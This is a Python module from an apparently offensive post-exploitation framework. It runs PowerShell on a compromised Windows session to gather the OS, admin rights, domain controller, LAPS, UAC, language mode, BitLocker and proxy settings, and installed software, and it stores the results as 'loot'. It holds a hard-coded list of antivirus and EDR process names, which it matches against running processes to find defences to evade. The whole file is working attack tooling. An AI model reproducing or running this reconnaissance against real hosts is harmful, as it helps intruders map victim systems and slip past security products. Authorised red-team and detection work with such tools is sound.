"""recon/sysinfo — deep host recon: OS, AV/EDR, domain, security posture. MITRE T1082"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre

_KNOWN_EDR = [
    "MsMpEng","SentinelAgent","SentinelOne","CylanceSvc","cbsensor","cb",
    "csagent","csfalconservice","bdagent","McShield","avp","ekrn","bdredline",
    "cylanceui","elastic-agent","osquery","falcon","tanium","carbonblack",
    "sepmaster","dcsvc","hmpalert","mbamservice","malwarebytes",
]


class SysInfo(BasePlugin):
    NAME        = "sysinfo"
    DESCRIPTION = "Full host profile: OS, domain, UAC, AV/EDR, .NET, proxy, BitLocker, security posture."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1082"
    CATEGORY    = "recon"
    schema      = ParamSchema().add(
        Param("sections", str, required=False, default="all",
              help="Comma-separated: os,domain,av,software,security,all"),
    )

    @mitre("T1082")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.ok(data={
                "hostname":   getattr(session, "hostname",   "unknown"),
                "os":         getattr(session, "os",         "unknown"),
                "arch":       getattr(session, "arch",       "unknown"),
                "username":   getattr(session, "username",   "unknown"),
                "ip":         getattr(session, "ip",         "unknown"),
                "priv_level": getattr(session, "priv_level", "user"),
            })

        secs = {s.strip() for s in params.get("sections", "all").split(",")}
        all_ = "all" in secs
        blocks = []

        if all_ or "os" in secs:
            blocks.append(
                "$os=Get-CimInstance Win32_OperatingSystem;"
                "Write-Output '=== OS ===';"
                "Write-Output \"OS       : $($os.Caption) Build $($os.BuildNumber)\";"
                "Write-Output \"Version  : $($os.Version)\";"
                "Write-Output \"Hostname : $env:COMPUTERNAME\";"
                "Write-Output \"User     : $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)\";"
                "Write-Output \"PID      : $PID\";"
                "Write-Output \"Arch     : $env:PROCESSOR_ARCHITECTURE\";"
                "$adm=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent())"
                ".IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator);"
                "Write-Output \"Admin    : $adm\";"
                "Write-Output \"Boot     : $($os.LastBootUpTime)\";"
                "Write-Output \"TZ       : $((Get-TimeZone).DisplayName)\";"
                "Write-Output \"Locale   : $((Get-Culture).Name)\";"
            )

        if all_ or "domain" in secs:
            blocks.append(
                "$cs=Get-CimInstance Win32_ComputerSystem;"
                "Write-Output '';"
                "Write-Output '=== Domain ===';"
                "Write-Output \"Domain   : $($cs.Domain)\";"
                "Write-Output \"PartOfDom: $($cs.PartOfDomain)\";"
                "try{$d=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();"
                "  Write-Output \"DomainCtl: $($d.FindDomainController().Name)\"}catch{};"
                "$laps=Get-ItemProperty 'HKLM:\\Software\\Policies\\Microsoft Services\\AdmPwd' -EA SilentlyContinue;"
                "Write-Output \"LAPS     : $(if($laps){'PRESENT'}else{'not detected'})\";"
            )

        if all_ or "security" in secs:
            blocks.append(
                "Write-Output '';"
                "Write-Output '=== Security Posture ===';"
                "$uac=Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -EA SilentlyContinue;"
                "Write-Output \"UAC      : EnableLUA=$($uac.EnableLUA) ConsentPrompt=$($uac.ConsentPromptBehaviorAdmin)\";"
                "Write-Output \"PS Ver   : $($PSVersionTable.PSVersion)\";"
                "Write-Output \"PS Policy: $((Get-ExecutionPolicy -List|Where-Object Scope -eq LocalMachine).ExecutionPolicy)\";"
                "Write-Output \"CLM      : $([System.Management.Automation.SessionState]::new().LanguageMode)\";"
                "$nets=(Get-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP' -Recurse -EA SilentlyContinue"
                "|Get-ItemProperty -Name Version -EA SilentlyContinue|Where-Object Version|Select-Object -ExpandProperty Version -Unique);"
                "Write-Output \".NET     : $($nets -join ', ')\";"
                "try{$bl=Get-BitLockerVolume -EA Stop|Select-Object -First 1;"
                "  Write-Output \"BitLocker: $($bl.ProtectionStatus)/$($bl.VolumeStatus)\"}catch{Write-Output 'BitLocker: query failed'};"
                "$prx=Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -EA SilentlyContinue;"
                "Write-Output \"Proxy    : $(if($prx.ProxyEnable){$prx.ProxyServer}else{'none'})\";"
            )

        if all_ or "av" in secs:
            edr_names = "','".join(_KNOWN_EDR)
            blocks.append(
                "Write-Output '';"
                "Write-Output '=== AV / EDR ===';"
                "try{"
                "  Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -EA Stop"
                "  |ForEach-Object{Write-Output \"AV WMI   : $($_.displayName) state=$($_.productState)\"}"
                "}catch{Write-Output 'AV WMI   : query failed (server OS?)'};"
                f"$edrs=@('{edr_names}');"
                "$running=Get-Process -EA SilentlyContinue|Select-Object -ExpandProperty Name;"
                "$found=$edrs|Where-Object{$r=$_;$running|Where-Object{$_ -like \"*$r*\"}};"
                "if($found){Write-Output \"EDR procs: $($found -join ', ')\"}else{Write-Output 'EDR procs: none detected'};"
            )

        if all_ or "software" in secs:
            blocks.append(
                "Write-Output '';"
                "Write-Output '=== Installed Software (top 20) ===';"
                "@('HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*',"
                " 'HKLM:\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*')"
                "|ForEach-Object{Get-ItemProperty $_ -EA SilentlyContinue}"
                "|Where-Object DisplayName|Sort-Object DisplayName|Select-Object -First 20"
                "|ForEach-Object{Write-Output \"  $($_.DisplayName) $($_.DisplayVersion)\"};"
            )

        ps = " ".join(blocks)
        r  = ctx.ps(ps)
        if r["status"] not in ("ok", "error"):
            return ModuleResult.err("Dispatch failed")
        return ModuleResult.ok(data=r["output"], loot_kind="sysinfo")
